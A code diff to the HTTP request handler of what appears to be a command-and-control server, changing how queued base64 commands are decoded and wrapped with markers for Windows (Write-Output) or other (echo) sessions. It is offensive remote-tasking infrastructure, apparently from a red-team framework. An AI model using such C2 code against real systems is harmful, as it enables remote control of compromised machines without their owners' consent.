@@ -194,12 +194,20 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 					for op_id, q in list(session.merge_command_queue.items()):
 						try:
 							cmd_b64 = q.get_nowait()
-							# wrap only this one
-							super_cmd_parts.append(f"""
-								Write-Output "__OP__{op_id}__";
-								{base64.b64decode(cmd_b64).decode("utf-8", errors="ignore")}
-								Write-Output "__ENDOP__{op_id}__";
-							""")
+							decoded_cmd = base64.b64decode(cmd_b64).decode("utf-8", errors="ignore")
+							session_os = session.metadata.get("os", "").lower()
+							if session_os == "windows":
+								super_cmd_parts.append(f"""
+									Write-Output "__OP__{op_id}__";
+									{decoded_cmd}
+									Write-Output "__ENDOP__{op_id}__";
+								""")
+							else:
+								super_cmd_parts.append(f"""
+									echo "__OP__{op_id}__";
+									{decoded_cmd}
+									echo "__ENDOP__{op_id}__";
+								""")
 							session.last_cmd_type = "cmd"
 							picked_op = op_id
 							#break
@@ -213,6 +221,8 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 						#del super_cmd_parts[0]
 					else:
 						cmd_b64 = ""
+
+				payload = cmd_b64.encode() if cmd_b64 else b""
 
 				server_out = http_get.get("server", {}).get("output", {})
 				envelope = server_out.get("envelope")
@@ -316,12 +326,20 @@ class C2HTTPRequestHandler(BaseHTTPRequestHandler):
 					for op_id, q in list(session.merge_command_queue.items()):
 						try:
 							cmd_b64 = q.get_nowait()
-							# wrap only this one
-							super_cmd_parts.append(f"""
-								Write-Output "__OP__{op_id}__";
-								{base64.b64decode(cmd_b64).decode("utf-8", errors="ignore")}
-								Write-Output "__ENDOP__{op_id}__";
-							""")
+							decoded_cmd = base64.b64decode(cmd_b64).decode("utf-8", errors="ignore")
+							session_os = session.metadata.get("os", "").lower()
+							if session_os == "windows":
+								super_cmd_parts.append(f"""
+									Write-Output "__OP__{op_id}__";
+									{decoded_cmd}
+									Write-Output "__ENDOP__{op_id}__";
+								""")
+							else:
+								super_cmd_parts.append(f"""
+									echo "__OP__{op_id}__";
+									{decoded_cmd}
+									echo "__ENDOP__{op_id}__";
+								""")
 							session.last_cmd_type = "cmd"
 							picked_op = op_id
 							#break
